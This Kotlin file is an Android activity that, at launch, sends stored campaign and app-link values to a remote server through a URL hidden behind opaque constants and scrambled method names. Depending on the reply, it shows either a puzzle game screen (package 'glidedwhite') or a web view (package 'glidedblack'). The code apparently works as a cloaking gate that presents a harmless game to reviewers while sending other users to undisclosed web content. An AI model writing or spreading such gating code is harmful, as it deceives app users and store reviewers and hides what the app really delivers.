package com.drea.glidedblack

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.drea.R
import com.drea.glidedblack.GLIDECONST.C1
import com.drea.glidedblack.GLIDECONST.D1
import com.drea.glidedblack.GLIDECONST.DEV
import com.drea.glidedwhite.PuzzleMainScreen
import com.orhanobut.hawk.Hawk
import kotlinx.android.synthetic.main.activity_filt.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class GlidedFilt : AppCompatActivity() {


    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filt)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = jdsjdowiqwe()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == GLIDECONST.jsoupCheck) {
                    Intent(applicationContext, PuzzleMainScreen::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webs::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun jdsjdowiqwe(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = GLIDECONST.lru + GLIDECONST.odone + hawk + "&" + GLIDECONST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = GLIDECONST.lru + GLIDECONST.odone + hawkAppLink + "&" +  GLIDECONST.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                hdysdgsdsda(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                hdysdgsdsda(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun hdysdgsdsda(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}